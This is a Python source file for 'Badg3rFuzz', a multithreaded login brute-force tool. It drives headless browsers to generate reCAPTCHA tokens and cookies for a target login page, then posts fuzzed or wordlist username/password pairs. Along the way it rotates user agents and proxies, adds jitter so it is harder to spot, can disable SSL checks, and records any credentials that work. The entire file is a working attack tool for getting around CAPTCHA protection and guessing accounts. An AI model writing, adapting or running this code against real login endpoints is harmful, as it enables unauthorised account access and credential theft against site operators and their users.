import argparse
import threading
from queue import Queue
import requests
import time
from datetime import datetime
import random
import string
import os
import sys
import queue
import signal
import subprocess
import tempfile
from selenium import webdriver
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

#Variables globales para colores

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'
GRAY = '\033[90m'
# Variables para manejo de drivers activos
active_drivers = []
drivers_lock = threading.Lock()

# Variables para barra de progreso
total_attempts = 0
attempts_done = 0
attempts_lock = threading.Lock()
start_time_prog = None
stop_event = threading.Event()

# Globales y flags
combo_queue = queue.Queue()
success_flag = threading.Event()
print_lock = threading.Lock()

# Banner y funciones de impresión
def print_banner():
    # Códigos de color ANSI
    
    now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    
    banner = f"""

        {RED}{BOLD}██████╗  █████╗ ██████╗  ██████╗ ██████╗ ██████╗{RESET}        
       {RED}{BOLD}██╔══██╗██╔══██╗██╔══██╗██╔════╝ ╚════██╗██╔══██╗{RESET}       
       {RED}{BOLD}██████╔╝███████║██║  ██║██║  ███╗ █████╔╝██████╔╝{RESET}       
       {RED}{BOLD}██╔══██╗██╔══██║██║  ██║██║   ██║ ╚═══██╗██╔══██╗{RESET}       
       {RED}{BOLD}██████╔╝██║  ██║██████╔╝╚██████╔╝██████╔╝██║  ██║{RESET}       
       {RED}{BOLD}╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝{RESET}        
                                                                                                                                                        
       {GREEN}{BOLD}███████╗██╗   ██╗███████╗███████╗{RESET}         
       {GREEN}{BOLD}██╔════╝██║   ██║╚══███╔╝╚══███╔╝{RESET}        
       {GREEN}{BOLD}█████╗  ██║   ██║  ███╔╝   ███╔╝ {RESET}        
       {GREEN}{BOLD}██╔══╝  ██║   ██║ ███╔╝   ███╔╝  {RESET}        
       {GREEN}{BOLD}██║     ╚██████╔╝███████╗███████╗{RESET}        
       {GREEN}{BOLD}╚═╝      ╚═════╝ ╚══════╝╚══════╝{RESET}        
                                                                             
 {MAGENTA}══════════════════════════════════════════════════════════════════════════{RESET}  
                             {WHITE}{BOLD}🦡 Badg3rFuzz v1.0{RESET}
                             {BLUE}Start: {now}{RESET}
                                                                             
   {GREEN}[>]{RESET} {WHITE}Initializing Badg3rFuzz modules...{RESET}                                                            
                                                                             
"""
    print(banner)

def print_footer(start_time):
    end_time = datetime.now()
    dur = end_time - start_time
    print(f"{GREEN}[ ✔ ] Finished Attacks. Total: {attempts_done}{RESET}")
    print(f"\n⌛ Finished: {end_time.strftime('%d-%m-%Y %H:%M:%S')} (duration {dur})\n")


# Handler para señales
def signal_handler(signum, frame):
    print(f"\n{YELLOW}[!] Received signal ({signum}), starting clean finish...{RESET}")
    stop_event.set()
    # Limpiar la cola inmediatamente para evitar bloqueos
    try:
        while True:
            combo_queue.get_nowait()
            combo_queue.task_done()
    except queue.Empty:
        pass

def convert_der_to_pem_if_needed(cert_path):
    """
    Convierte certificado DER a PEM si es necesario y retorna la ruta del archivo PEM
    """
    if not cert_path or not os.path.exists(cert_path):
        return cert_path
    
    try:
        # Intentar leer como PEM primero
        with open(cert_path, 'rb') as f:
            cert_data = f.read()
        
        # Verificar si ya es PEM
        if b'-----BEGIN CERTIFICATE-----' in cert_data:
            return cert_path
        
        # Crear archivo temporal para PEM
        temp_fd, temp_pem_path = tempfile.mkstemp(suffix='.pem', prefix='badg3r_cert_')
        os.close(temp_fd)

        # Intentar conversión con OpenSSL
        try:
            # Comando OpenSSL para convertir DER a PEM
            cmd = [
                'openssl', 'x509', 
                '-inform', 'DER', 
                '-in', cert_path, 
                '-out', temp_pem_path, 
                '-outform', 'PEM'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"{GREEN}[i] Converted DER to PEM successfully: {temp_pem_path}{RESET}")
                return temp_pem_path
            else:
                print(f"{RED}[!] OpenSSL conversion failed: {result.stderr.strip()}{RESET}")
                try:
                    os.remove(temp_pem_path)
                except:
                    pass
                return None
        except FileNotFoundError:
            print(f"{RED}[!] OpenSSL not found in system PATH{RESET}")
            print(f"{YELLOW}[!] Please install OpenSSL or convert certificate manually:{RESET}")
            print(f"{YELLOW}    openssl x509 -inform DER -in {cert_path} -out {cert_path}.pem{RESET}")
            try:
                os.remove(temp_pem_path)
            except:
                pass
            return None
        except subprocess.TimeoutExpired:
            print(f"{RED}[!] OpenSSL conversion timeout{RESET}")
            try:
                os.remove(temp_pem_path)
            except:
                pass
            return None  
    except Exception as e:
        print(f"{RED}[!] Error reading certificate file: {e}{RESET}")
        return None

def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="firefox", verbose=False):
    if stop_event.is_set() or success_flag.is_set():
        raise Exception("Operation cancelled by user")
    if verbose:
        with print_lock:
            print(f"\r{' ' * 80}\r", end='')
            print(f"[i] Init WebDriver: {webdriver_type}")

    driver = None
    try:
        if webdriver_type.lower() == "chrome":
            chrome_options = ChromeOptions()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--log-level=3")  # ERROR
            chrome_options.add_argument("--disable-logging")
            chrome_options.add_argument("--disable-infobars")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
            service = ChromeService(ChromeDriverManager().install(), log_output=open(os.devnull, 'w'))
            driver = webdriver.Chrome(service=service, options=chrome_options)

        else:  # firefox por defecto
            try:
                script_dir = os.path.dirname(os.path.abspath(__file__))
                gecko_path = os.path.join(script_dir, "geckodriver.exe")
                
                if not os.path.isfile(gecko_path):
                    print(f"{RED}[!] Does not found geckodriver.exe in: {gecko_path}{RESET}")
                    sys.exit(1)
                service = FirefoxService(executable_path=gecko_path)
            except:
                sys.exit()

            # Forzar headless con variables de entorno
            os.environ['MOZ_HEADLESS'] = '1'
            os.environ['DISPLAY'] = ':99'  # Para sistemas Linux sin display

            
            firefox_options = FirefoxOptions()
            # Múltiples formas de establecer headless para compatibilidad
            firefox_options.headless = True
            firefox_options.add_argument("--headless")
            firefox_options.add_argument("--no-sandbox")
            firefox_options.add_argument("--disable-dev-shm-usage")
            firefox_options.add_argument("--disable-gpu")
            firefox_options.add_argument("--window-size=1920,1080")
            
            # Suprimir logs y notificaciones
            firefox_options.set_preference("media.volume_scale", "0.0")
            firefox_options.set_preference("dom.webnotifications.enabled", False)
            firefox_options.set_preference("app.update.enabled", False)
            
            #Firefox location for specific platform
            if sys.platform == "win32":
                # Intentar múltiples rutas comunes en Windows
                possible_paths = [
                    r"C:\Program Files\Mozilla Firefox\firefox.exe",
                    r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
                    os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox\\firefox.exe")
                ]
                firefox_path = None
                for path in possible_paths:
                    if os.path.exists(path):
                        firefox_path = path
                        break
                
                if firefox_path:
                    firefox_options.binary_location = firefox_path
                else:
                    print(f"\r{' ' * 80}\r", end='')
                    print(f"{YELLOW}[!] Firefox is not founded in common places, using default path{RESET}")
            else:
                # Para Linux/Mac
                possible_paths = ["/usr/bin/firefox", "/usr/local/bin/firefox", "/opt/firefox/firefox"]
                firefox_path = None
                for path in possible_paths:
                    if os.path.exists(path):
                        firefox_path = path
                        break
                if firefox_path:
                    firefox_options.binary_location = firefox_path
            
            driver = webdriver.Firefox(service=service, options=firefox_options)
            
        with drivers_lock:
            active_drivers.append(driver)
        driver.get(login_url)

        try:
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CLASS_NAME, "g-recaptcha"))
            )
        except:
            if verbose:
                with print_lock:
                    print(f"\r{' ' * 80}\r", end='')
                    print("[!] Captcha Timeout")
            pass

        token = driver.execute_script(f"""
            return new Promise(resolve => {{
                grecaptcha.ready(function() {{
                    grecaptcha.execute("{site_key}", {{action: "{captcha_action}"}}).then(function(token) {{
                        resolve(token);
                    }});
                }});
            }});
        """)

        cookies = {cookie["name"]: cookie["value"] for cookie in driver.get_cookies()}
        return token, cookies
    finally:
        if driver:
            try:
                with drivers_lock:
                    if driver in active_drivers:
                        active_drivers.remove(driver)
                driver.quit()
            except:
                pass

def cargar_diccionario(filepath):
    if not filepath or not os.path.exists(filepath):
        return []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def cargar_user_agents(filepath):
    if not filepath or not os.path.exists(filepath):
        # User agents por defecto
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
    
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def cargar_proxies(proxy_file=None, single_proxy=None):
    """Multi Proxy loaded from file or single one by args"""
    proxies = []
    
    if single_proxy:
        proxies.append(single_proxy.strip())
    
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):  # Ignorar comentarios
                    proxies.append(line)
    
    # Validar formato básico de proxies
    valid_proxies = []
    for proxy in proxies:
        if '://' in proxy:  # Formato básico http://... o socks://...
            valid_proxies.append(proxy)
        else:
            with print_lock:
                print(f"\r{' ' * 80}\r", end='')
                print(f"{YELLOW}[!] Ignoring Proxy with invalid format: {proxy}{RESET}")
    
    return valid_proxies

def get_combined_patterns(custom_patterns, pattern_type="success"):
    """Combine custom and common patterns"""
    
    base_success_patterns = [
        "true", "success", "bienvenido", "dashboard", "welcome", "loggedin",
        "successful", "correcto", "válido", "exitoso", "login successful"
    ]
    
    base_fail_patterns = [
        "false", "error", "failed", "usuario", "contraseña", "erroneos", "erróneos", 
        "incorrecto", "inválido", "Usuario o contraseña erróneos",
        "Acceso denegado por captcha", "credenciales incorrectas", 
        "datos incorrectos", "login failed", "authentication failed"
    ]
    
    if pattern_type == "success":
        return base_success_patterns + (custom_patterns if custom_patterns else [])
    else:
        return base_fail_patterns + (custom_patterns if custom_patterns else [])

def generar_fuzzers(tipo="digits", min_len=5, max_len=10, cantidad=100):
    chars = ''
    if tipo == "digits":
        chars = string.digits
    elif tipo == "digits+":
        chars = "123456789"
    elif tipo == "letters":
        chars = string.ascii_letters
    elif tipo == "mix":
        chars = string.ascii_letters + string.digits
    elif tipo == "strong":
        chars = string.ascii_letters + string.digits + string.punctuation
    else:
        chars = string.digits

    fuzz = set()
    while len(fuzz) < cantidad:
        length = random.randint(min_len, max_len)
        fuzz.add(''.join(random.choices(chars, k=length)))
    return list(fuzz)

def check_success(response, success_indicators, fail_indicators, success_codes, check_cookies=True, verbose=False):
    """
    Smart multi-layer analysis for detect succesful login
    Priorize content analyze above HTTP Code response
    """
    response_text = response.text.lower()
    
    # Capa 1: Análisis de contenido - Patrones de FALLO (alta prioridad)
    for fail_pattern in fail_indicators:
        if fail_pattern.lower() in response_text:
            if verbose:
                with print_lock:
                    print(f"[DEBUG] Fail pattern found: {fail_pattern}")
            return False, f"Fail pattern detected: {fail_pattern}"
    
    # Capa 2: Análisis de contenido - Patrones de ÉXITO (alta prioridad)
    for success_pattern in success_indicators:
        if success_pattern.lower() in response_text:
            if verbose:
                with print_lock:
                    print(f"[DEBUG] Success pattern found: {success_pattern}")
            return True, f"Success pattern detected: {success_pattern}"
    
    # Capa 3: Verificar redirecciones exitosas
    if hasattr(response, 'history') and response.history:
        redirect_url = response.url.lower()
        success_redirect_patterns = ["dashboard", "home", "panel", "admin", "profile", "welcome"]
        
        for pattern in success_redirect_patterns:
            if pattern in redirect_url:
                if verbose:
                    with print_lock:
                        print(f"[DEBUG] Success redirect detected: {redirect_url}")
                return True, f"Success redirect to: {pattern}"
    
    # Capa 4: Verificar cookies de sesión
    if check_cookies and response.cookies:
        session_cookie_patterns = ["session", "auth", "login", "token", "jsessionid", "phpsessid"]
        
        for cookie_name in response.cookies.keys():
            cookie_name_lower = cookie_name.lower()
            for pattern in session_cookie_patterns:
                if pattern in cookie_name_lower:
                    if verbose:
                        with print_lock:
                            print(f"[DEBUG] Session cookie detected: {cookie_name}")
                    return True, f"Session cookie set: {cookie_name}"
    
    # Capa 5: Análisis JSON (compatibilidad con código existente)
    try:
        data = response.json()
        if not data.get("Result", True):
            msg = data.get("Msg", "Unknown JSON error")
            return False, f"JSON Result=False: {msg}"
        elif data.get("Result", False):  # Explícitamente True
            return True, "JSON Result=True"
    except ValueError:
        # No es JSON, continuar
        pass
    
    # Capa 6: Códigos HTTP como indicador COMPLEMENTARIO (baja prioridad)
    if response.status_code in success_codes and response.status_code != 200:
        if verbose:
            with print_lock:
                print(f"[DEBUG] Success HTTP code detected: {response.status_code}")
        return True, f"Success HTTP code: {response.status_code}"
    
    # Si llegamos aquí, asumimos fallo por defecto
    return False, f"No success indicators found (HTTP: {response.status_code})"

def login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url=None, 
                  webdriver_type="firefox", verbose=False, user_agent=None, proxy=None, proxy_timeout=20,
                  disable_ssl_verify=False, ca_cert_path=None):
    # Verificar si debemos parar antes de crear WebDriver
    if stop_event.is_set() or success_flag.is_set():
        raise Exception("Operation cancelled")    
    token, cookies = generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type, verbose)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": user_agent if user_agent else "Mozilla/5.0",        
        "Origin": origin_url if origin_url else login_url.split("/")[0],
        "Referer": login_url,
        "Accept": "*/*"
    }

    data = {
        "User": username,
        "Pass": password,
        "tokenCaptcha": token
    }

    with requests.Session() as s:
        s.cookies.update(cookies)
        
        # Configurar SSL
        if disable_ssl_verify:
            s.verify = False
            # Suprimir warnings de SSL
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        elif ca_cert_path and os.path.exists(ca_cert_path):
            pem_cert_path = convert_der_to_pem_if_needed(ca_cert_path)
            if pem_cert_path and os.path.exists(pem_cert_path):
                s.verify = pem_cert_path
                if verbose:
                    with print_lock:
                        print(f"\r{' ' * 80}\r", end='')
                        print(f"[i] Using CA cert: {pem_cert_path}")
            else:
                with print_lock:
                    print(f"\r{' ' * 80}\r", end='')
                    print(f"{RED}[!] Could not process certificate file: {ca_cert_path}{RESET}")
                    print(f"{YELLOW}[!] Falling back to default SSL verification{RESET}")
        
        # Configurar proxy si se proporciona
        if proxy:
            proxies_dict = {
                'http': proxy,
                'https': proxy
            }
            s.proxies.update(proxies_dict)
        
        # Configurar timeout
        if verbose:
            req = requests.Request("POST", post_url, headers=headers, data=data)
            prepared = s.prepare_request(req)
            print("\n=== REQUEST DEBUG ===")
            print(f"URL: {prepared.url}")
            print(f"Method: {prepared.method}")
            print("Headers:")
            for k, v in prepared.headers.items():
                print(f"  {k}: {v}")
            print("\nBody:")
            print(prepared.body.decode() if isinstance(prepared.body, bytes) else prepared.body)
            print("=====================\n")
        response = s.post(post_url, headers=headers, data=data, timeout=proxy_timeout)
    return response

def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_success, log_filename, 
          webdriver_type, verbose, success_indicators, fail_indicators, success_codes, check_cookies, 
          delay, jitter, user_agents_file, proxies_list, proxy_timeout, disable_ssl_verify, ca_cert_path):
    global attempts_done
    thread_id = threading.current_thread().ident
    user_agents = cargar_user_agents(user_agents_file)
    ua_index = 0
    # Inicializar índices para rotación
    proxy_index = 0
    current_proxy = None
    if proxies_list:
        current_proxy = proxies_list[proxy_index % len(proxies_list)]
    
    while not success_flag.is_set() and not stop_event.is_set():
        try:
            # Timeout más corto para que el thread sea más responsivo a las señales
            username, password = combo_queue.get(timeout=0.5)
        except queue.Empty:
            break
        # Seleccionar user agent rotativo
        current_ua = user_agents[ua_index % len(user_agents)]
        ua_index += 1
        # Verificar nuevamente si debemos parar antes de procesar
        if stop_event.is_set() or success_flag.is_set():
            combo_queue.task_done()
            break
            
        try:
            # Verificar eventos antes de intentar login
            response = login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url, 
                         webdriver_type, verbose, current_ua, current_proxy, proxy_timeout,
                         disable_ssl_verify, ca_cert_path)
            # Rotar proxy si hay múltiples
            if proxies_list and len(proxies_list) > 1:
                proxy_index += 1
                current_proxy = proxies_list[proxy_index % len(proxies_list)]
            # Rate limiting
            if delay > 0:
                sleep_time = delay
                if jitter > 0:
                    sleep_time += random.uniform(0, jitter)
                time.sleep(sleep_time) 
            with print_lock:
                print(f"\r{' ' * 80}\r", end='')
                if verbose:
                    print(f"[+] Login:password attempt : {username}:{password}")
                    print(f"[+] Server Response : HTTP Code {response.status_code}> {response.json()}")
                else:
                    print(f"[+] Attempt: {username}:{password}")

                success, error_msg = check_success(
                    response, 
                    success_indicators, 
                    fail_indicators,
                    success_codes,
                    check_cookies,
                    verbose
                )
                if success:
                    print(f"{GREEN}[+] Valid Login Found! {username}:{password}{RESET}")
                    with open(log_filename, "a", encoding="utf-8") as f:
                        f.write(f"SUCCESS: {username}:{password}\n")
                    success_flag.set()
                    if stop_on_success:
                        # Limpiar la cola
                        while not combo_queue.empty():
                            try:
                                combo_queue.get_nowait()
                                combo_queue.task_done()
                            except queue.Empty:
                                break
                else:
                    with open(log_filename, "a", encoding="utf-8") as f:
                        f.write(f"[-] FAIL: {username}:{password}\n")
                        
        except Exception as e:
            if not stop_event.is_set():
                with print_lock:
                    if "proxy" in str(e).lower():
                        print(f"\r{' ' * 80}\r", end='')
                        print(f"{RED}[!] Proxy Error with {username}:{password}: {e}{RESET}")
                    else:
                        print(f"\r{' ' * 80}\r", end='')
                        print(f"{RED}[!] Error with {username}:{password}: {e}{RESET}")
        finally:
            # Actualizar contador y marcar tarea como completada
            with attempts_lock:
                attempts_done += 1
            try:
                combo_queue.task_done()
            except ValueError:
                # Ya fue marcada como completada
                pass            

def parse_user_fuzzer(fuzzer_str):
    # formato tipo:min_len:max_len:cantidad
    # ejemplo digits:6:6:100
    try:
        tipo, min_len, max_len, count = fuzzer_str.split(":")
        return tipo, int(min_len), int(max_len), int(count)
    except Exception as e:
        raise ValueError(f"Invalid format for --user-fuzz: {fuzzer_str}. Must be type:min_len:max_len:count")

def mostrar_barra_progreso():
    global total_attempts, attempts_done, start_time_prog
    if start_time_prog is None:
        start_time_prog = time.time()

    while not success_flag.is_set() and (attempts_done < total_attempts) and not stop_event.is_set():
        with attempts_lock:
            percent = (attempts_done / total_attempts) * 100 if total_attempts > 0 else 0
            elapsed = time.time() - start_time_prog
            speed = attempts_done / elapsed if elapsed > 0 else 0
            remaining = total_attempts - attempts_done
            eta = remaining / speed if speed > 0 else 0

        bar_length = 30
        filled_length = int(bar_length * attempts_done // total_attempts) if total_attempts else 0
        bar = '=' * filled_length + '-' * (bar_length - filled_length)

        with print_lock:
            print(f"\r{CYAN}[{bar}] {attempts_done}/{total_attempts} ({percent:.2f}%) | ETA: {eta:.1f}s{RESET}", end='', flush=True)

        time.sleep(0.2)

    # Imprime línea final al terminar
    with print_lock:
        print()

def preparar_combos(username_file, password_file, user_fuzzer):
    if username_file and os.path.exists(username_file):
        usernames = cargar_diccionario(username_file)
    else:
        # genera fuzz para usuarios
        if user_fuzzer:
            tipo, min_len, max_len, cantidad = parse_user_fuzzer(user_fuzzer)
            usernames = generar_fuzzers(tipo, min_len, max_len, cantidad)
        else:
            usernames = generar_fuzzers("digits", 5, 12, 20)

    if password_file and os.path.exists(password_file):
        passwords = cargar_diccionario(password_file)
    else:
        passwords = generar_fuzzers("strong", 8, 16, 20)

    for u in usernames:
        for p in passwords:
            combo_queue.put((u, p))

def cleanup_and_exit(threads, start_time):
    """Function to clean up resources and exit gracefully"""
    print(f"\n{YELLOW}[!] Init gracefully exit...{RESET}")
    
    # Establecer eventos de parada
    stop_event.set()
    
    # Forzar cierre de todos los WebDrivers activos
    force_kill_drivers()
    
    print(f"{YELLOW}[!] Forcing threads termination...{RESET}")
    print_footer(start_time)

def wait_for_threads(threads, timeout=3):
    """Esperar threads con timeout agresivo"""
    for i, t in enumerate(threads):
        if t.is_alive():
            try:
                t.join(timeout=timeout)
                if t.is_alive():
                    print(f"{YELLOW}[!] Thread {i+1} timeout - forcing exit{RESET}")
            except:
                pass

def force_kill_drivers():
    """Fuerza el cierre de todos los drivers activos"""
    global active_drivers
    
    with drivers_lock:
        drivers_to_kill = active_drivers.copy()
        active_drivers.clear()
    
    for driver in drivers_to_kill:
        try:
            driver.quit()
        except:
            pass

def cleanup_temp_certs():
    """Limpiar certificados temporales creados durante la ejecución"""
    import glob
    temp_certs = glob.glob('/tmp/badg3r_cert_*.pem') + glob.glob(os.path.join(tempfile.gettempdir(), 'badg3r_cert_*.pem'))
    for cert_file in temp_certs:
        try:
            os.remove(cert_file)
        except:
            pass

def main():
    # Configurar handlers de señales
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    parser = argparse.ArgumentParser(description="Badg3rScan - Fuzzer/fuerza bruta con recaptcha")
    parser.add_argument("--success-indicators", nargs='+', default=[],help="Additional success patterns to look for in response (case insensitive)")
    parser.add_argument("--fail-indicators", nargs='+', default=[], help="Additional failure patterns to look for in response (case insensitive)")
    parser.add_argument("--success-codes", nargs='+', type=int, default=[302], help="HTTP codes that indicate success")
    parser.add_argument("--delay", type=float, default=0, help="Base delay between requests in seconds")
    parser.add_argument("--jitter", type=float, default=0, help="Random jitter 0-X seconds added to delay")
    parser.add_argument("--user-agents-file", help="File with user agents list for rotation")
    parser.add_argument("--check-cookies", action="store_true", default=True, help="Check for session cookies as success indicator")
    parser.add_argument("--site-key", required=True, help="Site key del reCaptcha")
    parser.add_argument("--captcha-action", required=True, help="Action del reCaptcha")
    parser.add_argument("--login-url", required=True, help="URL donde se carga el captcha (frontend)")
    parser.add_argument("--post-url", required=True, help="URL para POST login")
    parser.add_argument("--pass-file", help="Archivo con passwords uno por línea")
    parser.add_argument("--user-file", help="Archivo con usuarios uno por línea")
    parser.add_argument("--user-fuzz", help="Fuzzer para usuarios tipo:min_len:max_len:cantidad (ejemplo digits:6:6:100)")
    parser.add_argument("--threads", type=int, default=5, help="Cantidad de hilos (default 5)")
    parser.add_argument("--stop-on-success", action="store_true", help="Detener al primer login válido")
    parser.add_argument("--origin-url", help="URL para la cabecera Origin (opcional)")
    parser.add_argument("--no-banner", action="store_true", help="Desactiva el banner genial de badg3rscan", default=False)
    parser.add_argument("--webdriver", choices=["chrome", "firefox"], default="firefox", help="Webdriver a usar: chrome o firefox (default firefox)")
    parser.add_argument("--verbose", action="store_true", help="Activa impresión detallada", default=False)
    parser.add_argument("--proxy", help="Proxy único formato http://user:pass@host:port o http://host:port")
    parser.add_argument("--proxy-file", help="Archivo con lista de proxies (uno por línea)")
    parser.add_argument("--proxy-timeout", type=int, default=20, help="Timeout para conexiones proxy en segundos")
    parser.add_argument("--disable-ssl-verify", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--ca-cert", help="Path to CA certificate file to add to trust chain")
    args = parser.parse_args()
    if args.no_banner == False:
        print_banner()
    else:
        t = datetime.now()
        print(f"{WHITE}{BOLD}🦡 Badg3rFuzz v1.0 {RESET}")
        print(f"{BLUE}Inicio: {t.strftime('%d-%m-%Y %H:%M:%S')}{RESET}    ")

    preparar_combos(args.user_file, args.pass_file, args.user_fuzz)
    print(f"[>] Loading fuzzing payloads and brute force wordlists...")
    print(f"[>] {combo_queue.qsize()} combo prepares.")
    global total_attempts
    total_attempts = combo_queue.qsize()

    # Cargar proxies
    proxies_list = cargar_proxies(args.proxy_file, args.proxy)
    if proxies_list:
        print(f"[>] {len(proxies_list)} proxies loaded")
    else:
        print("[>] No proxies setup - Direct connection")

    log_filename = f"fuzzlog-{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.log"

    start_time = datetime.now()
    print(f"[>] Ready to fuzz and bruteforce your targets! 🦡💥")
    print(f"[>] Starting {args.threads} threads...")
    time.sleep(1)  # pause for visual
    print(f"[>] Fuzzing in progress...")
    threads = []
    
    
    # Preparar patrones combinados
    combined_success = get_combined_patterns(args.success_indicators, "success")
    combined_fail = get_combined_patterns(args.fail_indicators, "fail")
    try:
        # Crear threads worker (sin iniciar aún)
        for _ in range(args.threads):
            t = threading.Thread(target=worker, args=(
                args.site_key,
                args.captcha_action,
                args.login_url,
                args.post_url,
                args.origin_url,
                args.stop_on_success,
                log_filename,
                args.webdriver,
                args.verbose,
                combined_success,
                combined_fail,
                args.success_codes,
                args.check_cookies,
                args.delay,
                args.jitter,
                args.user_agents_file,
                proxies_list,
                args.proxy_timeout,
                args.disable_ssl_verify,
                args.ca_cert
            ))
            t.daemon = False
            threads.append(t)

        # Pausa para inicialización limpia
        time.sleep(0.5)

        # Iniciar todos los threads worker
        for t in threads:
            t.start()
            time.sleep(0.1)  # Pequeño delay entre inicios
        
        # Iniciar barra de progreso DESPUÉS de los workers
        barra_thread = threading.Thread(target=mostrar_barra_progreso, daemon=True)
        barra_thread.start()
        # Esperar finalización con timeout agresivo
        start_wait = time.time()
        max_wait_time = 300  # 5 minutos máximo

        while not stop_event.is_set() and not success_flag.is_set():
            # Verificar si todos los threads terminaron naturalmente
            all_done = all(not t.is_alive() for t in threads)
            
            # Verificar si la cola está vacía
            queue_empty = combo_queue.empty()
            
            # Verificar timeout general
            elapsed = time.time() - start_wait
            
            if all_done or queue_empty or elapsed > max_wait_time:
                break
                
            time.sleep(0.5)
        
        # Esperar threads con timeout corto
        wait_for_threads(threads, timeout=2)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!]  Ctrl+C Detected...{RESET}")
        stop_event.set()
    finally:
        stop_event.set()
        cleanup_and_exit(threads, start_time)
        cleanup_temp_certs()
        os._exit(0)  # Salida forzada inmediata

if __name__ == "__main__":
   main()